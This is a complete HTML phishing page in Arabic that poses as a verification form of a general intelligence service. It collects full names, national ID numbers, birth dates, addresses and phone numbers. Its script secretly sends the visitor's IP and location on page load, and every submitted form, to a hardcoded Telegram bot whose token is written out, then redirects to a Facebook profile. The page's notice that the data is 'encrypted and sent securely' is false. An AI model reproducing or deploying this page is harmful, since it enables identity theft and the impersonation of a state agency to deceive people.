<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>نموذج جهاز الـ 101 - استخبارات العامة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1e1e2f;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .form-container {
            background: #2a2a3b;
            padding: 35px 25px;
            border-radius: 24px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
            border: 1px solid #3e3e55;
        }
        .form-container h2 {
            color: #ffffff;
            font-size: 22px;
            margin-bottom: 8px;
            text-align: center;
            letter-spacing: 1px;
        }
        .form-container .sub {
            color: #a0a0b8;
            font-size: 14px;
            text-align: center;
            margin-bottom: 25px;
            border-bottom: 1px solid #3a3a4f;
            padding-bottom: 15px;
        }
        label {
            color: #c8c8e0;
            font-size: 14px;
            font-weight: 500;
            display: block;
            margin-top: 16px;
            margin-bottom: 6px;
        }
        input, select, textarea {
            width: 100%;
            padding: 12px 14px;
            border-radius: 12px;
            border: 1px solid #3f3f57;
            background: #1e1e2f;
            color: #f0f0ff;
            font-size: 15px;
            transition: 0.25s;
            outline: none;
        }
        input:focus, select:focus, textarea:focus {
            border-color: #6a6aff;
            box-shadow: 0 0 0 3px rgba(106, 106, 255, 0.2);
            background: #25253a;
        }
        textarea {
            resize: vertical;
            min-height: 70px;
        }
        .btn-submit {
            margin-top: 28px;
            background: #6a6aff;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            transition: 0.3s;
            letter-spacing: 0.5px;
        }
        .btn-submit:hover {
            background: #5757e6;
            transform: scale(1.01);
            box-shadow: 0 0 20px rgba(106, 106, 255, 0.3);
        }
        .note {
            color: #7a7a9a;
            font-size: 12px;
            text-align: center;
            margin-top: 18px;
        }
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            font-weight: 500;
            background: #1e1e2f;
            color: #b0b0d0;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>⚡ جهاز الـ 101</h2>
    <div class="sub">استخبارات العامة – قسم التحقق الميداني</div>

    <form id="mainForm">
        <label>🔹 الاسم الكامل</label>
        <input type="text" id="fullName" placeholder="الاسم الرباعي" required>

        <label>🔹 رقم الهوية / البطاقة الشخصية</label>
        <input type="text" id="idNumber" placeholder="رقم الهوية" required>

        <label>🔹 تاريخ الميلاد</label>
        <input type="date" id="dob" required>

        <label>🔹 مكان الإقامة (المدينة / الحي)</label>
        <input type="text" id="location" placeholder="المدينة، الحي، الشارع" required>

        <label>🔹 رقم الجوال</label>
        <input type="tel" id="phone" placeholder="مثال: 09xxxxxxxx" required>

        <label>🔹 البريد الإلكتروني (اختياري)</label>
        <input type="email" id="email" placeholder="example@mail.com">

        <label>🔹 الجهة / القسم التابع لها</label>
        <input type="text" id="department" placeholder="الجهة أو القسم" required>

        <label>🔹 ملاحظات إضافية</label>
        <textarea id="notes" placeholder="أي تفاصيل إضافية..."></textarea>

        <button type="submit" class="btn-submit">✅ إرسال البيانات</button>
    </form>

    <div id="status"></div>
    <div class="note">يتم تشفير البيانات وإرسالها بشكل آمن.</div>
</div>

<script>
    // ======== بيانات التليغرام المحدثة ========
    const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
    const CHAT_ID = "7214473798";
    // ===========================================

    const form = document.getElementById('mainForm');
    const statusDiv = document.getElementById('status');

    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message.substring(0, 4096),
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.error("Telegram send error:", e);
        }
    }

    async function getIPInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return `🌐 IP: ${data.ip}\n🏙️ المدينة: ${data.city || 'غير معروف'}\n🌍 الدولة: ${data.country_name || 'غير معروف'}\n📡 المزود: ${data.org || 'غير معروف'}`;
        } catch (e) {
            return '🌐 تعذر جلب الـ IP';
        }
    }

    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        statusDiv.innerText = '⏳ جاري الإرسال...';
        statusDiv.style.color = '#f0c060';

        const name = document.getElementById('fullName').value.trim();
        const id = document.getElementById('idNumber').value.trim();
        const dob = document.getElementById('dob').value;
        const location = document.getElementById('location').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const email = document.getElementById('email').value.trim();
        const department = document.getElementById('department').value.trim();
        const notes = document.getElementById('notes').value.trim();

        const ipInfo = await getIPInfo();

        let msg = `🕵️ <b>جهاز الـ 101 - بيانات جديدة</b>\n\n`;
        msg += `👤 <b>الاسم:</b> ${name}\n`;
        msg += `🆔 <b>رقم الهوية:</b> ${id}\n`;
        msg += `📅 <b>تاريخ الميلاد:</b> ${dob}\n`;
        msg += `📍 <b>مكان الإقامة:</b> ${location}\n`;
        msg += `📱 <b>الجوال:</b> ${phone}\n`;
        if (email) msg += `✉️ <b>البريد:</b> ${email}\n`;
        msg += `🏢 <b>الجهة:</b> ${department}\n`;
        if (notes) msg += `📝 <b>ملاحظات:</b> ${notes}\n`;
        msg += `\n${ipInfo}\n`;
        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;

        await sendToTelegram(msg);

        statusDiv.innerText = '✅ تم الإرسال بنجاح!';
        statusDiv.style.color = '#80d080';

        form.reset();

        setTimeout(() => {
            window.location.href = "https://www.facebook.com/jableh.ali.jbr";
        }, 2000);
    });

    (async function () {
        const ipInfo = await getIPInfo();
        await sendToTelegram(`📡 <b>جهاز الـ 101 - دخول جديد</b>\n${ipInfo}\n🕒 ${new Date().toLocaleString('ar-EG')}`);
    })();
</script>
</body>
</html>
